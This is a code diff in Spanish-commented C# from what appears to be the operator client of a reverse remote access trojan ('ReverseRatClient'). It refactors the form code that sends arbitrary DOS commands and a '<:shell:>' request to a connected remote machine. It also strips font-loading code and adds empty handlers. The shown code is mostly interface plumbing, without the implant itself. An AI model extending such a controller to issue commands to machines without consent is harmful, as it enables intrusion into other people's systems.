@@ -18,22 +18,26 @@ namespace ReverseRatClient
 
         private void button3_Click(object sender, EventArgs e)
         {
-            ProcesarComandosDos();
+            ProcesarComandosDos(textBox2.Text);
         }
 
-        private void ProcesarComandosDos()
+        private void ProcesarComandosDos(string comando)
         {
             // Envia cualquier conmando DOS
             var pc = (Principal) Msc.DevolverMDI("Principal");
-            pc.EnviarComando(textBox2.Text, Text);
-
-            if (textBox2.Text == @"cls")
-                textBox1.Text = "";
-            if (textBox2.Text == @"exit")
+            pc.EnviarComando(comando, Text);
+            
+            textBox3.Text = comando.Trim();
+            switch (comando )
             {
-                textBox1.AppendText("\r\nSesion finalizada\r\n");
-                ScrollVentanaDos();
-                textBox1.ReadOnly = true;
+                case "cls":
+                    textBox1.Text = "";
+                    break;
+                case "exit":
+                    textBox1.AppendText("\r\nSesion finalizada\r\n");
+                    ScrollVentanaDos();
+                    textBox1.ReadOnly = true;
+                    break;
             }
 
             textBox2.Text = "";
@@ -58,43 +62,9 @@ namespace ReverseRatClient
         {
           
            
-            //After that we can create font and assign font to label
-           // InicializarFuente();
-        //    textBox1.Font  = new Font(pfc.Families[0], textBox1.Font.Size);
-
-           /* try
-            {
-                PrivateFontCollection modernFont = new PrivateFontCollection();
-                modernFont.AddFontFile("VGASquarePx.ttf");
-                textBox1.Font = new Font(modernFont.Families[0], 21);
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.Message);
-            }*/
-           // textBox1.KeyDown += OnKeyDown();
+      
         }
 
-        void InicializarFuente()
-        {
-         
-
-            //Select your font from the resources.
-            //My font here is "Digireu.ttf"
-            int fontLength = Properties.Resources.VGASquarePx.Length;
-
-            // create a buffer to read in to
-            byte[] fontdata = Properties.Resources.VGASquarePx;
-
-            // create an unsafe memory block for the font data
-            IntPtr data = Marshal.AllocCoTaskMem(fontLength);
-
-            // copy the bytes to the unsafe memory block
-            Marshal.Copy(fontdata, 0, data, fontLength);
-
-            // pass the font to the font collection
-            pfc.AddMemoryFont(data, fontLength);
-        }
 
         private void PanelDeControl_KeyDown(object sender, KeyEventArgs e)
         {
@@ -104,7 +74,7 @@ namespace ReverseRatClient
 
         private void button1_Click(object sender, EventArgs e)
         {
-            textBox2.Text = @"hola";
+            textBox2.Text = @"<:hola:>";
             button3.PerformClick();
         }
 
@@ -139,7 +109,7 @@ namespace ReverseRatClient
             if (e.KeyCode != Keys.Return)
                 button2.PerformClick();           
             else
-              ProcesarComandosDos();
+              ProcesarComandosDos(textBox2.Text);
         }
 
         private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
@@ -210,12 +180,22 @@ namespace ReverseRatClient
         private void button4_Click(object sender, EventArgs e)
         {
             textBox1.ReadOnly = false;
-            textBox2.Text = "shell";
-            ProcesarComandosDos();
+            textBox2.Text = "<:shell:>";
+            ProcesarComandosDos(textBox2.Text);
             EstablecerFuenteLetraShell();
             tabControl1.SelectTab(tabPage2);
             textBox1.Focus();
             ScrollVentanaDos();           
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void groupBox2_Enter(object sender, EventArgs e)
+        {
+
         }
     }
 
